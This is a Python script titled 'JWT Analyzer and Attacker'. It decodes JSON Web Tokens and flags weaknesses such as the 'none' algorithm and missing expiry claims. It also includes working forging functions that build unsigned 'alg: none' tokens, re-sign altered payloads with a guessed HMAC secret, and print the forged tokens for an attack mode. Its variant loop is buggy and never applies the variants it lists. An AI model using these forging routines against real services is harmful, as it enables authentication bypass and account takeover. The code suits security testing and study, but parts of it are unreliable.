#!/usr/bin/env python3
"""
JWT Analyzer and Attacker
Usage: python jwt_analyzer.py <token>
"""

import sys
import base64
import json
import hashlib
import hmac
import time

class JWTAnalyzer:
    def __init__(self, token=None):
        self.token = token
        self.header = {}
        self.payload = {}
        self.signature = ''
        
    def decode(self):
        """Decode JWT"""
        if not self.token:
            return None
        
        parts = self.token.split('.')
        if len(parts) != 3:
            print("[!] Invalid JWT format")
            return None
        
        try:
            # Decode header
            self.header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            
            # Decode payload  
            self.payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            self.signature = parts[2]
        except Exception as e:
            print(f"[!] Error decoding: {e}")
            return None
        
        return {'header': self.header, 'payload': self.payload}
    
    def analyze(self):
        """Analyze JWT vulnerabilities"""
        self.decode()
        
        if not self.header:
            return None
        
        issues = []
        
        # Check algorithm
        alg = self.header.get('alg', '')
        
        # None algorithm
        if alg.lower() in ['none', 'null', 'n', 'NIone']:
            issues.append({
                'type': 'algorithm confusion',
                'severity': 'CRITICAL',
                'description': 'JWT algorithm set to "none" - can skip signature verification'
            })
        
        # Weak algorithms
        if alg in ['HS256', 'HS384', 'HS512']:
            issues.append({
                'type': 'weak algorithm',
                'severity': 'MEDIUM',
                'description': 'HMAC algorithm - vulnerable to key confusion if public key available'
            })
        
        # Check claims
        exp = self.payload.get('exp')
        if exp and exp < time.time():
            issues.append({
                'type': 'expired token',
                'severity': 'INFO',
                'description': f'Token expired at {exp}'
            })
        
        if 'exp' not in self.payload:
            issues.append({
                'type': 'no expiration',
                'severity': 'MEDIUM',
                'description': 'Token never expires'
            })
        
        if 'nbf' not in self.payload:
            issues.append({
                'type': 'no not-before',
                'severity': 'LOW',
                'description': 'No not-before claim'
            })
        
        if 'iat' not in self.payload:
            issues.append({
                'type': 'no issued-at',
                'severity': 'LOW',
                'description': 'No issued-at claim'
            })
        
        # Check for sensitive data in payload
        sensitive = ['password', 'secret', 'token', 'key', 'credit', 'card', 'ssn', 'social']
        for key in self.payload:
            if any(s in key.lower() for s in sensitive):
                issues.append({
                    'type': 'sensitive data',
                    'severity': 'HIGH',
                    'description': f'Sensitive field in payload: {key}'
                })
        
        return issues
    
    def forge_none(self):
        """Create JWT with none algorithm"""
        header = {'alg': 'none', 'typ': 'JWT'}
        payload = self.payload.copy()
        
        import json
        h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        return f"{h}.{p}."
    
    def forge_hs256(self, new_header=None, new_payload=None, secret='secret'):
        """Forge JWT with HS256"""
        if new_header is None:
            new_header = self.header.copy()
        if new_payload is None:
            new_payload = self.payload.copy()
        
        new_header['alg'] = 'HS256'
        
        import json
        h = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
        p = base64.urlsafe_b64encode(json.dumps(new_payload).encode()).decode().rstrip('=')
        
        # Sign with secret
        message = f"{h}.{p}"
        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        s = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{message}.{s}"
    
    def attack_none(self):
        """Attack with none algorithm"""
        forged = self.forge_none()
        print(f"\n[+] Forged 'none' token:")
        print(f"    {forged}")
        
        # Try variations
        for alg in ['NONE', 'None', 'null', 'n', 'Ni', 'NoNe', 'NOne']:
            forged = self.forge_none()
            print(f"[+] Trying: {forged}")
        
        return forged
    
    def print_analysis(self):
        """Print analysis"""
        self.decode()
        issues = self.analyze()
        
        print("\n" + "="*50)
        print("JWT ANALYSIS")
        print("="*50)
        
        print("\n[*] Header:")
        print(json.dumps(self.header, indent=2))
        
        print("\n[*] Payload:")
        print(json.dumps(self.payload, indent=2))
        
        print(f"\n[*] Signature: {self.signature[:20]}...")
        
        if issues:
            print(f"\n[!] Found {len(issues)} issues:")
            for issue in issues:
                print(f"    [{issue['severity']}] {issue['type']}")
                print(f"        {issue['description']}")
        else:
            print("\n[+] No obvious issues")


def main():
    if len(sys.argv) < 2:
        print("Usage: python jwt_analyzer.py <token>")
        print("\nCommands:")
        print("  python jwt_analyzer.py <token>        - Analyze token")
        print("  python jwt_analyzer.py <token> none  - Attack none algorithm")
        sys.exit(1)
    
    token = sys.argv[1]
    analyzer = JWTAnalyzer(token)
    
    if len(sys.argv) > 2 and sys.argv[2] == 'none':
        analyzer.attack_none()
    else:
        analyzer.print_analysis()


if __name__ == "__main__":
    main()